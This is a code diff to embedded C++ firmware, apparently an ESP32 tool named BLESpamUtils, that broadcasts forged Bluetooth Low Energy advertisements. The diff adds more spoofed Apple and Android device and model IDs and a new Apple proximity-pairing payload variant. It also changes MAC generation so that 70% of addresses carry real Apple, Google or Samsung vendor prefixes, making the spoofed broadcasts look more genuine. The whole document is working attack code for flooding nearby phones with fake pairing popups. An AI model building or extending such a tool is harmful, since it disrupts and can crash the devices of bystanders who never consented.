@@ -21,6 +21,8 @@ const uint8_t IOS_DEVICES[][31] = {
     {0x17}, // BeatsStudioPro
     {0x12}, // BeatsFitPro
     {0x16}, // BeatsStdBudsPlus
+    {0x20}, // PowerBeats4
+    {0x01}, // AirPodsGen1
 };
 
 const uint8_t IOS_ACTIONS[] = {
@@ -49,7 +51,13 @@ const uint32_t ANDROID_MODELS[] = {
     0x1E955B, 0x1EC95C, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 
     0x07C95C, 0x07F426, 0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0xD99CA1, 
     0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9, 0x13B39D, 0x7C6CDB, 0x005EF9, 
-    0xE2106F, 0xB37A62, 0x92ADC9
+    0xE2106F, 0xB37A62, 0x92ADC9,
+    // Additional models for more variety
+    0x2D7A23, 0x0E30C3, 0x72EF8D, 0x0003F0, 0x002000, 0x003000, 0x003001, 0x00A168,
+    0x01EEB4, 0x02AA91, 0x01C95C, 0x02D815, 0x035764, 0x038CC7, 0x02DD4F, 0x02E2A9,
+    0x035754, 0x02C95C, 0x03AA91, 0x03C95C, 0x04C95C, 0x050F0C, 0x052CC7, 0x058D08,
+    0x1ED9F9, 0x1EE890, 0x1EEDF5, 0x1F1101, 0x1F181A, 0x1F2E13, 0x1F4589, 0x1F4627,
+    0x1F5865, 0x1FBB50, 0x1FC95C, 0x1FE765, 0x1FF8FA, 0x201C7C, 0x202B3D, 0x20330C
 };
 
 const uint8_t SAMSUNG_WATCH_MODELS[] = {
@@ -60,11 +68,30 @@ const uint8_t SAMSUNG_WATCH_MODELS[] = {
 // --- Helper Functions ---
 
 void BLESpamUtils::generateRandomMac(uint8_t* mac) {
-    for (int i = 0; i < 6; i++) {
-        mac[i] = random(0, 256);
+    // Use common OUI prefixes for more realistic MACs
+    const uint8_t OUI_PREFIXES[][3] = {
+        {0x00, 0x1A, 0x7D}, // Apple
+        {0x00, 0x16, 0xCB}, // Apple
+        {0x94, 0x65, 0x9C}, // Apple
+        {0xF8, 0xFF, 0xC2}, // Google
+        {0xAC, 0x37, 0x43}, // Google
+        {0xFC, 0xE8, 0x92}, // Samsung
+        {0x34, 0x08, 0xBC}, // Samsung
+    };
+    
+    // Randomly select an OUI or fully random
+    if (random(0, 100) < 70) { // 70% use real OUI
+        int ouiIdx = random(0, 7);
+        memcpy(mac, OUI_PREFIXES[ouiIdx], 3);
+        for (int i = 3; i < 6; i++) {
+            mac[i] = random(0, 256);
+        }
+    } else { // 30% fully random
+        for (int i = 0; i < 6; i++) {
+            mac[i] = random(0, 256);
+        }
+        mac[0] = (mac[0] & 0xFC) | 0x02;
     }
-    // Set unicast and locally administered bits
-    mac[0] = (mac[0] & 0xFC) | 0x02; 
 }
 
 std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
@@ -82,7 +109,7 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
             data.push_back(0x4C);
             data.push_back(0x00);
             
-            int subtype = random(0, 2);
+            int subtype = random(0, 3);
             if (subtype == 0) { // Airpods style
                 uint8_t device = IOS_DEVICES[random(0, sizeof(IOS_DEVICES)/31)][0];
                 data.push_back(0x0F); // Type
@@ -92,9 +119,8 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
                 data.push_back(random(0, 256));
                 data.push_back(random(0, 256));
                 data.push_back(random(0, 256));
-            } else { // Setup style (IOS2 from Bruce)
+            } else if (subtype == 1) { // Setup style (IOS2 from Bruce)
                 uint8_t action = IOS_ACTIONS[random(0, sizeof(IOS_ACTIONS))];
-                // 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, ACTION, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
                 uint8_t payload[] = {
                     0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 
                     0x0f, 0x05, 0xc1, 
@@ -102,6 +128,15 @@ std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
                     0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
                 };
                 for(uint8_t b : payload) data.push_back(b);
+            } else { // Extended proximity pairing
+                uint8_t device = IOS_DEVICES[random(0, sizeof(IOS_DEVICES)/31)][0];
+                data.push_back(0x07); // Type (Proximity)
+                data.push_back(0x19); // Length
+                data.push_back(0x07); // Flags
+                data.push_back(device);
+                for (int i = 0; i < 21; i++) {
+                    data.push_back(random(0, 256));
+                }
             }
             break;
         }
